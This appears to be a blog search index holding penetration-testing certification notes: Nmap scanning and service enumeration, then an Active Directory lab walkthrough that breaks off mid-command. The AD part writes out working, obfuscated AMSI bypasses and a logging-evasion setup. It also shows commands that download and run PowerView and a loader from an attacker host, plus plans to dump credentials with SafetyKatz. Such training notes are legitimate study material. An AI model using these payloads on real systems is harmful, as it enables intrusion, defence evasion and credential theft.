[ { "title": "Certified Penetration Testing Specialist Notes", "url": "/posts/CPTS/", "categories": "notes", "tags": "Windows, Active Directory, htb, Linux", "date": "2023-03-31 11:12:00 -0500", "snippet": "Network Enumeration with NmapNmap is one of the most used tools by network admins and IT security specialists, it can be used to Audit the security aspects of networks, simulate penetration tests, check firewall and IDS settings and configurations, test types of possible connections, network mapping, response analysis, identify open ports, and vulnerability assessments as well. Nmap offers many different types of scans, and can basically be divided into: Host Discovery, Port Scanning, Service Enumeration and Detection, OS Detection, and scriptable interactions with the target service through the nmap scripting engine. The basic syntax for nmap isnmap &lt;scan types&gt; &lt;options&gt; &lt;target&gt;The TCP-SYN (-sS) is one of the default settings and is one of the most popular scan methods. This scan method makes it possible to scan thousands of ports per second. The TCP-SYN scan sends one packet with the SYN flag, and never completes the 3-way handshake.-If the target responds with SYN-ACK, nmap detects the port as open-If the packet receives an RST flag, it is an indication that the port is closed.-If Nmap does not receive a packet back, it will display the port as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.Host DiscoveryA basic scan that can be used to search a subnet for alive hosts issudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5where -sn disables port scanning, and -oA tnet will output the results in all formats starting with the name tnet. We can also scan hosts from a list using the -iL hosts.txt option, where hosts.txt is a list of hosts, 1 per line. If we disable the port scan (with -sn), Nmap automatically will ping scan with ICMP Echo Requests (-PE), where nmap will expect an ICMP Reply if the host is alive. We can confirm this with the --packet-trace option to ensure the ICMP echo requests are sent. Another way to determine why nmap has marked a host alive is with the --reason option.Host and Port ScanningThere are a total of 6 different states for scanned ports that we can obtain. State Description Open This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. Closed When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not. Filtered Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target. Unfiltered This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed. Open|Filtered If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port. Closed|Filtered This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall. We can use the --top-ports=x flag to scan for x top ports, -p 21 to scan only port 21, or -p- to scan all ports, or -F for top 100 ports (fast scan). Also -n can be used to disable DNS resolution.Connect ScanThe nmap TCP Connect Scan (-sT) uses the TCP 3-way handshake to determine if a specific port on a target is open or closed. The Connect Scan is useful because it is the most accurate way to determine the state of a port, and it is also the most stealthy, unlike other types of scans, such as the SYN scan, the connect scan does not leave any unfinished connections or unsent packets on the target host, which makes it less likely to be detected by IDS or IPS, and is useful when you want to scan a network but don’t want to disturb the services running behind it.Filtered PortsWhen a port is shown as filtered, it can be shown this way for several reasons, in most cases, firewalls have certain rules set to handle specific connections, The packets can either be dropped or rejected. When a packet gets dropped, nmap receives no response from our target, and marks the port as filtered. These will require further investigation later on, but for now there is no way to interact with the port.Discovering Open UDP PortsSince UDP is a stateless protocol, we do not receive any acknowledgment, consequently, the timeout is much longer, making UDP scans (-sU) Much slower than TCP scans. If the UDP port is open, we will only get a response if the application is configured to do so. If we get an ICMP response with error code 3 (port unreachable) we know that the port is indeed closed.Saving Results-oN for Normal output, -oG for Grepable output, and -oX for XML output. or -oA for all formats. With the XML output, we can easily create HTML reports that are useful for documentation as it presents the results in a detailed and clear way. To convert from XML to HTML we can use the tool xsltproc as such:xsltproc target.xml -o target.htmlService Enumeration-sV can be used to enumerate versions, after a successful 3-way handshake, the server often sends a banner for identification. This serves to let the client know which service it is working with. At the Network level, this happens with a PSH flag in the TCP header. However, some services may not provide this information immediately. We can use nc -nv ip port to grab the banner.An example packet capture looks like this18:28:07.128564 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [S], seq 1798872233, win 65535, options [mss 1460,nop,wscale 6,nop,nop,TS val 331260178 ecr 0,sackOK,eol], length 018:28:07.255151 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [S.], seq 1130574379, ack 1798872234, win 65160, options [mss 1460,sackOK,TS val 1800383922 ecr 331260178,nop,wscale 7], length 018:28:07.255281 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], ack 1, win 2058, options [nop,nop,TS val 331260304 ecr 1800383922], length 018:28:07.319306 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [P.], seq 1:36, ack 1, win 510, options [nop,nop,TS val 1800383985 ecr 331260304], length 35: SMTP: 220 inlane ESMTP Postfix (Ubuntu)18:28:07.319426 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [.], ack 36, win 2058, options [nop,nop,TS val 331260368 ecr 1800383985], length 0Where S is SYN, S. is SYN-ACK, . is ACK, P. is PSH-ACK, and . ACK confirms the receipt of the data at the end.Nmap Scripting EngineThere are a total of 14 categories of scripts Category Description Auth Determination of authentication credentials. Broadcast Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. brute Executes scripts that try to log in to the respective service by brute-forcing with credentials. default Default scripts executed by using the -sC option. discovery Evaluation of accessible services. dos These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services. exploit This category of scripts tries to exploit known vulnerabilities for the scanned port. external Scripts that use external services for further processing. fuzzer This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time. intrusive Intrusive scripts that could negatively affect the target system. malware Checks if some malware infects the target system. safe Defensive scripts that do not perform intrusive and destructive access. version Extension for service detection. vuln Identification of specific vulnerabilities. There are several way to define the desired scripts in nmapDefault Scriptssudo nmap &lt;target&gt; -sCSpecific Scripts Categorysudo nmap &lt;target&gt; --script &lt;category&gt;Defined Scriptssudo nmap &lt;target&gt; --script &lt;script-name&gt;,&lt;script-name&gt;,...Nmap Aggressive scansudo nmap &lt;ip&gt; -p &lt;port&gt; -A-A will perform service detection, OS detection, traceroute, and uses default scripts to scan the targetVulnerability Assessmentsudo nmap &lt;port&gt; -p &lt;ip&gt; -sV --script vulnThese scripts interact with the service and find out more information about their versions and check various databases to see if there are known vulnerabilities.PerformanceThere are many options for telling Nmap how fast (-T &lt;1-5&gt;), with which frequency (--min-parallelism &lt;number&gt;), which timeouts (--max-rtt-timeout &lt;time&gt;) the test packets should have, how many packets should be sent simultaneously (--min-rate &lt;number&gt;), and with the number of retries (--max-retries &lt;number&gt;) for the scanned ports that the targets should be scanned.TimeoutsWHen nmap sends a packet, it takes some time (RTT=Round Trip Time) to receive a response from the scanned port. Generally nmap starts with a high timeout of 100ms. 1 way to speed up a scan is by:sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100msWere --initial-rtt-timeout 50ms sets the specified time value as initial RTT timeout, and --max-rtt-timeout 100ms sets the specified time value as maximum RTT timeout. However, too short of a time period may cause us to miss hosts in the output, so this exact command is not recommended.Max RetriesAnother way to increase the scans’ speed is to specify the retry rate. The default value is 10 but we can reduce this as such, which again can negatively impact the results:sudo nmap 10.129.2.0/24 -F --max-retries 0RatesDuring an engagement, we might get whitelisted, and the network might have ample bandwidth to support such scanning, we can really speed things up with:sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300Timingnmap offers 6 different timing templates -T &lt;0-5&gt; for us to use. The higher the value, the more aggressive the scan. We can experience negative effects if we scan too fast, like missing hosts or getting picked up/blocked by security systems. The default timing nmap uses is -T 3. -T 0 / -T Paranoid -T 1 / -T Sneaky -T 2 / -T Polite -T 3 / -T Normal -T 4 / Aggressive -T 5 / Insane Firewall and IDS/IDP EvasionFirewalls are software components that monitor network traffic between the firewall and incoming data connections, and decides how to handle the connection based on pre-defined rules that have been set. Similarly, an IDS will scan the network for potential attacks, analyze them, and report any detected attacks. An IPS compliments an IDS by taking specific defensive measures, should an attack be detected. The analysis of such attacks is based on pattern matching and signatures.Determine Firewalls and Their RulesWhen a port is shown as filtered, it can have several reasons. In most cases, firewalls have certain rules set to handle specific connections. The packets can either be dropped or rejected. dropped packets are ignored, and no response is returned from the host. On the other hand, rejected packets are returned with an RST flag. These packets contain different types of ICMP error codes, or contain nothing at all. Such errors can be: Net Unreachable Net Prohibited Host Unreachable Host Prohibited Port Unreachable Port Prohibited Nmap’s TCP ACK (-sA) method is much harder to filter for firewalls and IDS/IPS systems compared to regular SYN (-sS) or (-sT) because they send a TCP packet with only the ACK flag. Packets with the ACK flag are usually passed by the firewall because it can not determine whether the connection was first established from the external or the internal network.Detect IDS/IPSDetection of IDS/IPS is much more difficult because these are passive traffic monitoring systems. If you get picked up by an IDS/IPS, proceeding with the test will be much more difficult, as your ISP may be notified and your internet will be revoked, or you may just be blocked from the target environment. Ideally, you would have access to several VPS’s with different IPs to determine whether such systems are on the target network during a pentest, if one gets blocked, you would need to use the others in a more careful and stealthy manner.DecoysThere are cases in which admins block specific subnets from different regions. This prevents any access to the target network. Another example is if an IPS exists and blocks us. For this reason, the Decoy Scanning Method (-D) is the right choice. With this method, nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. It is critical that the decoys must be alive, otherwise the service on the target may be unreachable due to SYN-flooding security mechanisms.sudo nmap 10.129.2.28 -p 80 -sS -D RND:5The RND:5 generates five random IP addresses that indicates the source IP the connection comes from.We can also use -S to specify a source IP, because it may be possible that specific subnets are blocked from accessing the resource, we can try our luck with another:sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0DNS ProxyingDNS queries are traditionally made over UDP port 53, however due to IPv6 and DNSSEC expansions, many DNS requests are made over TCP port 53 now. Nmap gives us a way to specify DNS servers ourselves (--dns-server &lt;ns&gt;,&lt;ns&gt;). This method could be important to us if we are in a DMZ. The company’s DNS servers are usually more trusted than online ones, so for example we could use them to interact with the hosts of the internal network. We could make TCP port 53 our source port (--source-port) for our scans. If an admin uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.Connect to the Filtered PortIf we discover that the firewall allows traffic from TCP port 53, we can use netcat to establish a connection as suchncat -nv --source-port 53 &lt;ip&gt; &lt;port&gt;FootprintingFTPClient and Server establish control channel through TCP port 21. The client sends commands to the server, and the server responds status codes, then both the client and server can establish a data channel over TCP port 20, which is used exclusively for data transmission.TFTPTrivial File Transfer Protocol is simpler than FTP and performs file transfers between client and server processes, however it does not provide user authentication and other features supported by FTP. While FTP uses TCP, TFTP uses UDP, making it unreliable for data transfers. Here are a few commands in TFTP: Commands Description Connect Sets the remote host, and optionally the port, for file transfers Get Transfers a file or set of files from the remote host to the local host Put Transfers a file or set of files from the local host onto the remote host Quit exits TFTP Status Shows the current status, like transfer mode (ascii or binary), connection status, time-out value, and so on Verbose Turns verbose mode on, which displays additional information Unlike FTP, TFTP does not have a directory listing functionalityDefault Configuration of vsFTPdOne of the most used FTP servers in linux-based distros is vsFTPd. The default config can be found in /etc/vsftpd.conf Setting Description listen=NO Run from inetd or as a standalone daemon? listen_ipv6=YES Listen on IPv6 ? anonymous_enable=NO Enable Anonymous access? dirmessage_enable=YES Display active directory messages when users go into certain directories? use_localtime=YES Use local time? xferlog_enable=YES Activate logging of uploads/downloads? connect_from_port_20=YES Connect from port 20? secure_chroot_dir=/var/run/vsftpd/empty Name of an empty directory pam_service_name=vsftpd This string is the name of the PAM service vsftpd will use. rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem The last three options specify the location of the RSA certificate to use for SSL encrypted connections. rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key   ssl_enable=NO   There is also a file /etc/ftpusers that is used to deny certain users access to FTP service. Users in this file are not allowed to log in to the FTP service.Dangerous SettingsOne of the most common things to test for when testing FTP is anonmyous access, these settings look like this: Setting Description anonymous_enable=YES Allowing anonymous login? anon_upload_enable=YES Allowing anonymous to upload files? anon_mkdir_write_enable=YES Allowing anonymous to create new directories? no_anon_password=YES Do not ask anonymous for password? anon_root=/home/username/ftp Directory for anonymous. write_enable=YES Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? Logging in Anonymouslyftp anonymous@&lt;ip address&gt;Useful Commands and SettingsA useful setting for protecting FTP is hide_ids=YES, which means the UID and GUID representation of the service will be overwritten, making it difficult for us to see the rights that these files have. This prevents local usernames from being revealed.Another useful setting is ls_recurse_enabled=YES, if this is enabled we can do ls -R which will give us a better overview of the FTP directory structure.We can download a file with Get File\\ Name.txt where the name of the file is File Name.txt, the \\ is used to escape the space.We can also use wget to download all files recursively as such:wget -m --no-passive ftp://anonymous:anonymous@&lt;ip address?Or once logged in, we can prompt OFF, recurse ON and mget *We can Upload files with the put command, like this put &lt;filename&gt;.extFootprinting FTPWe can start by updating the nse database as suchsudo nmap --script-updatedbAll the NSE scripts are generally located in /usr/share/nmap/scripts/, or we can find them with this simple commandfind / -type f -name ftp* 2&gt;/dev/null | grep scriptsWhich will return all nmap scripts that start with ftp.Service Interactionnc -nv &lt;ip&gt; 21telnet &lt;ip&gt; 21It is a little different if the FTP server runs with TLS/SSL encryption, as we need a client that can handle that. We can use openssl as such.openssl s_client -connect &lt;ip&gt;:21 -starttls ftpSMBUseful commands for enumerating SMB are:#anonymously list sharessmbclient -L -N \\\\&lt;IP/FQDN&gt;\\ and #connect to a share anonymouslysmbclient -N \\\\&lt;IP/FQDN&gt;\\&lt;share&gt;We can also use rpcclient :rpcclient -U \"\" &lt;ip&gt;Then some usual commands are,srvinfo-&gt; Server information.enumdomains-&gt; Enumerate all domains that are deployed in the network.querydominfo-&gt; Provides domain, server, and user information of deployed domains.netshareenumall-&gt; Enumerates all available shares.netsharegetinfo &lt;share&gt;-&gt; Provides information about a specific share.enumdomusers-&gt; Enumerates all domain users.queryuser &lt;RID&gt;-&gt; Provides information about a specific user.We can do enumdomusers, grab the user and group rids, then queryuser &lt;rid&gt; or querygroup ridWe can also use a tool from impacket samrdump.py to bruteforce RIDS as such:samrdump.py &lt;ip&gt;Another useful tool is enum4linux, which we can use as./enum4linux-ng &lt;ip&gt; -ANFSNetwork File System has the same purpose as SMB, but it is only used between Linux and Unix systems, unlike SMB/Samba which are cross compatible with Windows/AD and Linux.We can footprint the service with nmapsudo nmap &lt;ip&gt; -p111,2049 -sC -sVthe rpcinfo NSE script retrieves a list of all currently running RPC services, their names and description, and the ports they use. Nmap also has some NSE scripts that we can run on NFS as such:sudo nmap --script nfs* &lt;ip&gt; -sV -p111,2049to show available NFS shares:showmount -e 10.129.14.128And then to mount the sharemkdir target-NFSsudo mount -t nfs &lt;ip&gt;:/ ./target-NFS/ -o nolockcd target-NFStree .To unmountcd ..sudo umount ./target-NFSDNSThere are several types of DNS servers:DNS Root Server- The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe.Authoritative Nameserver- Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client’s query, the root name server takes over at that point.Non-authoritative Nameserver- Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.Caching DNS Server- Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.Forwarding Server- Forwarding servers perform only one function: they forward DNS queries to another DNS server.Resolver- Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.There are also different DNS records used for DNS queries:A- Returns an IPv4 address of the requested domain as a result.AAAA-Returns an IPv6 address of the requested domain.MX-Returns the responsible mail servers as a result.NS-Returns the DNS servers (nameservers) of the domain.TXT-This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.CNAME-This record serves as an alias. If the domain www.hackthebox.eu should point to the same IP, and we create an A record for one and a CNAME record for the other.PTR- The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.SOA- Provides information about the corresponding DNS zone and email address of the administrative contact.Footprinting DNSNS Querydig ns &lt;domain&gt;.com @&lt;dns IP&gt;Sometimes it is possible to query a DNS server’s version using a class CHAOS type query and type TXT. this entry must exist on the DNS server to work:dig CH TXT version.bind &lt;dns ip&gt;We can use the ANY to view all avaialbe records, which causes the service to disclose all available entries that it can share.dig any &lt;domain&gt;.com @&lt;dns ip&gt;Zone Transfer refers to the transfer of zones to another server in DNS, which usually happens over TCP port 53. This is abbreviated Asynchronous Full Transfer Zone (AXFR).dig axfr &lt;domain&gt;.com @&lt;dns ip&gt;or for internaldig axfr internal.&lt;domain&gt;.com @&lt;dns-ip&gt;We can also use a for loop in bash to query for individual A records.for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;doneAnother tool that can do this is DNSenumdnsenum --dnsserver &lt;dns-ip&gt; --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt &lt;target domain&gt;.comSMPTTo interact with SMTP, we can use telnet to initialize a TCP connection.telnet &lt;ip&gt;Helo mail1.inlanefreight.htbDepending how the server is configured, we can use the VRFY command to enumerate userstelnet &lt;ip&gt; 25VRFY rootTo send an emailtelnet &lt;ip&gt; 25EHLO inlanefreight.htbMAIL FROM: &lt;goober@goober.htb&gt;RCPT TO: &lt;goober2@goober.htb&gt; NOTIFY=success,failureDATAQUITFootprinting SMPTsudo nmap &lt;ip&gt; -sC -sV -p25We can also use NSE’s smtp-open-relay script to identify if the target server can be used as an open relay.sudo nmap &lt;ip&gt; -p25 --script smtp-open-relay" }, { "title": "Certified Red Team Professional Notes", "url": "/posts/CRTP/", "categories": "notes", "tags": "Windows, Active Directory", "date": "2023-03-07 15:23:00 -0600", "snippet": "Certified Red Team Professional NotesWeek 1• Enumerate useful information like users, groups, group memberships,computers, user properties, trusts, ACLs etc. to map attack paths!• Learn and practice different local privilege escalation techniques on a Windows machine.• Hunt for local admin privileges on machines in the target domain using multiple methods.• Abuse enterprise applications to execute complex attack paths that involve bypassing antivirus and pivoting to different machines.Learning Objective 1Enumerating Users, Computers, Domain Admins, and Enterprise Admins.Using PowerViewStart a PowerShell session using Invisi-Shell to avoid enhanced logging. (\\AD\\Tools\\InvisiShell\\RunWithRegistryNonAdmin.bat)C:\\Users\\studentx&gt;cd \\AD\\ToolsC:\\AD\\Tools&gt;C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.batC:\\AD\\Tools&gt;set COR_ENABLE_PROFILING=1C:\\AD\\Tools&gt;set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}C:\\AD\\Tools&gt;REG ADD \"HKCU\\Software\\Classes\\CLSID\\{cf0d821e-299b-5307-a3d8-b283c03916db}\" /fThe operation completed successfully.C:\\AD\\Tools&gt;REG ADD \"HKCU\\Software\\Classes\\CLSID\\{cf0d821e-299b-5307-a3d8-b283c03916db}\\InprocServer32\" /fThe operation completed successfully.C:\\AD\\Tools&gt;REG ADD \"HKCU\\Software\\Classes\\CLSID\\{cf0d821e-299b-5307-a3d8-b283c03916db}\\InprocServer32\" /ve /t REG_SZ /d\"C:\\AD\\Tools\\InviShell\\InShellProf.dll\" /fThe operation completed successfully.C:\\AD\\Tools&gt;powershellWindows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.Load Powerview in the PowerShell Session. C:\\Ad\\Tools\\PowerView.ps1To see users in the domain,Get-DomainUserand to get only a specific property of all users, use the select-object cmdlet as such.Get-DomainUser | select -ExpandProperty samaccountnameTo see domain computer objectsGet-DomainComputer | select -ExpandProperty dnshostnameto see details of the DA group, can get SIDs, MembernamesGet-DomainGroup -Identity \"Domain Admins\"To enumerate members of the EA groupGet-DomainGroupMember -Identity \"Enterprise Admins\"If you are not in the root domain, this command will not work. You need to query the root domain as EA group is only present in the root of the forest.Get-DomainGroupMember -Identity \"Enterprise Admins\" -Domain moneycorp.localUsing ADModuleIn a different invisishell session, import the ADModule withImport-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dlland Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1Then you can begin user enumeration withGet-ADUser -Filter *Use the -Properties paramter to filter by the properties you want to see, for exampleGet-ADUser -Filter * -Properties * | select Samaccountname,DescriptionTo list computersGet-ADComputer -Filter *Enumerate Domain Administrators withGet-ADGroupMember -Identity 'Domain Admins'Enumerate Enterprise Admins withGet-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.localLearning Objective 2Enumerate OUs, list all computers in the StudentMachines OU, List the GPOs, Enumerate GPO applied on the StudentMachines OU.PowerViewTo list all OUsGet-DomainOUTo only see the names of OUsGet-DomainOU | select -ExpandProperty nameListing all computers in the StudentMachines OU more complicated(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select nameTo get GPOsGet-DomainGPOTo Enumerate GPO applied on the StudentMachines OU, you need to copy part of the gplink attribute from the output of the command below:(Get-DomainOU -Identity StudentMachines).gplinkThe part you need to copy will look like{7478F170-6A0C-490C-B355-9E4618BC785D}Then, to see GPO applied to StudentMachines, useGet-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}'With powershell magic, you can do this all in one command:Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11, (Get-DomainOU -Identity StudentMachines).gplink.length-72)Learning Objective 3Enumerate ACL for DA group, and view modify rights and permissions for students.Using PowerViewTo enumerate ACLs in the Domain Admins GroupGet-DomainObjectAcl -Identity \"Domain Admins\" -ResolveGUIDS -VerboseTo check for modify rights/permissions, use Find-InterestingDomainACL from powerview as suchFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"&lt;student name&gt;\"}To see permissions for the RDP groupFind-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match \"RDPUsers\"}Learning Objective 4Using PowerviewTo enumerate all domains in the current forestGet-ForestDomain -VerboseTo map all the trusts of the domainGet-DomainTrustTo list only the external trusts in the moneycorp.local forestGet-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |?{$_.TrustAttributes -eq \"FILTER_SIDS\"}To identiy external trusts of the dollarcorp domain, we can use the below command.Get-DomainTrust | ?{$_.TrustAttributes -eq \"FILTER_SIDS\"}Since we have Bidirectional trust between these 2 forests, we can extract information from the eurocorp.local forest. You need either bi-directional or one-way trust from the eurocorp.local to dollarcorp to be able to use the below command.Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}Learning Objective 5In this learning objective we will exploit a service on our machine to elevate privileges to local admin. Then Identiy a machine on the domain where we have local admin access. Also we use privileges of a user on jenkins on a host to get admin privileges on the dcorp-ci server.We begin by loading powerview after bypassing amsi.. C:\\AD\\Tools\\PowerUp.ps1Invoke-AllChecksWe can use the abuse-function (Invoke-ServiceAbuse) and add our current domain user to the local Administrators group.Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp/student520' -VerboseLogging in and out shows we have local administrator privileges.For the next task, we will identify a machine in the domain where we have local admin using the Find-PSRemotingLocalAdminAccess.ps1C:\\AD\\Tools&gt;C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat[snip]PS C:\\AD\\Tools&gt; . C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1PS C:\\AD\\Tools&gt; Find-PSRemotingLocalAdminAccessWe have admin access on dcorp-adminsrv and on the student machine, we can connect to dcorp-adminsrv using winrs as the student user withwinrs -r:dcorp-adminsrv cmdOr you can do it with PowerShell RemotingPS C:\\AD\\Tools&gt; Enter-PSSession -ComputerName dcorpadminsrv.dollarcorp.moneycorp.localPS C:\\AD\\Tools&gt; [dcorpadminsrv.dollarcorp.moneycorp.local]C:\\Users\\studentx\\Documents&gt; whoamidcorp\\studentxLearning Objective 6This learning objective focuses on setting up BloodHound to identify the shortest path to Domain Admins in the domain. BLoodhound uses neo4j graph database, so that needs to be set up first.Install and start the neo4j service as follows:C:\\AD\\Tools\\neo4j-community-4.4.5-windows\\neo4j-community4.4.5\\bin&gt;neo4j.bat install-serviceNeo4j service installedC:\\AD\\Tools\\neo4j-community-4.4.5-windows\\neo4j-community4.4.5\\bin&gt;neo4j.bat startOnce the service is installed browse to localhost:7474 and login with neo4j:neo4j creds, and openblood hound from C:\\AD\\Tools\\bloodHound-win32-x64\\BloodHound-win-32-x64 and provide the detailsbolt://localhost:7687 and the user/pass you set in the previous step. Then run the .net AMSI bypass by using this$ZQCUW = @\"using System;using System.Runtime.InteropServices;public class ZQCUW { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, stringprocName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtrdwSize, uint flNewProtect, out uint lpflOldProtect);}\"@Add-Type $ZQCUW$BBWHVWQ =[ZQCUW]::LoadLibrary(\"$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'))\")$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,\"$([systeM.neT.webUtility]::HtMldECoDE('&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'))\")$p = 0[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)$TLML = \"0xB8\"$PURX = \"0x57\"$YNWL = \"0x00\"$RTGX = \"0x07\"$XVON = \"0x80\"$WRUD = \"0xC3\"$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)Then run the following commands to run the collector:C:\\AD\\Tools&gt;C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.batPS C:\\AD\\Tools&gt; cd C:\\AD\\Tools\\BloodHound-master\\BloodHound-master\\CollectorsPS C:\\AD\\Tools\\BloodHound-master\\BloodHound-master\\Collectors&gt; $ZQCUW[snip .NET AMSI bypass]PS C:\\AD\\Tools\\BloodHound-master\\BloodHound-master\\Collectors&gt; ..\\SharpHound.ps1PS C:\\AD\\Tools\\BloodHound-master\\BloodHound-master\\Collectors&gt; InvokeBloodHound -CollectionMethod All -Verbose2023-03-03T07:01:16.5006490-08:00|INFORMATION|This version of SharpHound iscompatible with the 4.2 Release of BloodHound2023-03-03T07:01:16.8282702-08:00|INFORMATION|Resolved Collection Methods:Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container,RDP, ObjectProps, DCOM, SPNTargets, PSRemote2023-03-03T07:01:16.8595176-08:00|INFORMATION|Initializing SharpHound at 7:01AM on 3/3/20232023-03-03T07:01:22.3601219-08:00|INFORMATION|Flags: Group, LocalAdmin,GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps,DCOM, SPNTargets, PSRemote[snip]SharpHound Enumeration Completed at 7:02 AM on 3/3/2023! Happy Graphing!Once the data is uploaded to bloodhound, search for shortest path to domain admins, ctrl will toggle labels.Learning Objective 7Identify a machine in the target domain where a domain admin session is available, and compromise the machine and escalate to prvileges to domain admin.From our reverse shell we got on the CI machine through jenkins, we can grab PowerView from our attack machine and look for machines where a domain admin is logged in using Find-DomainUserLocation.First you grab the sbloggingbypass.txt from the attackers machine withPS C:\\Users\\Administrator\\.jenkins\\workspace\\Projectx&gt; iex (iwrhttp://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)use the below command to bypass AMSIPS C:\\Users\\Administrator\\.jenkins\\workspace\\Projectx&gt; S`eT-It`em ( 'V'+'aR'+ 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( \"{1}{0}\"-F'F','rE' ) ); ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) ).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( \"{2}{4}{0}{1}{3}\" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} )Then download and executre PowerView in memory on the victim machine withiex ((New-ObjectNet.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))Make sure to host the file using HFS.exe or your prefered choice of hosting software. Then runFind-DomainUserLocationThis command can take a while, but you can see if there is a domain admin session available. You can abuse it by using winrs or powershell remoting. To use winrs,usewinrs -r:dcorp-mgmt hostname;whoamiThen we can run safetykatz.exe on the dcorp-mgmt to extract credentials. To do that, we need to copy loader.exe on dcorp-mgmt from the dcorp-ci machine we have to avoid any downloading activity on dcorp-mgmt.Run the following command on the reverse shelliwr http://172.16.100.20/Loader.exe -OutFile C:\\Users\\Public\\Loader.exeThen copy it to the victim machine as suchecho F | xcopy C:\\Users\\Public\\Loader.exe \\\\dcorp-mgmt\\C$\\Users\\Public\\Loader.exeUsing winrs add the following port forward rule on dcorp-mgmt to avoid detected$null | winrs -r:dcorp-mgmt \"netsh interface 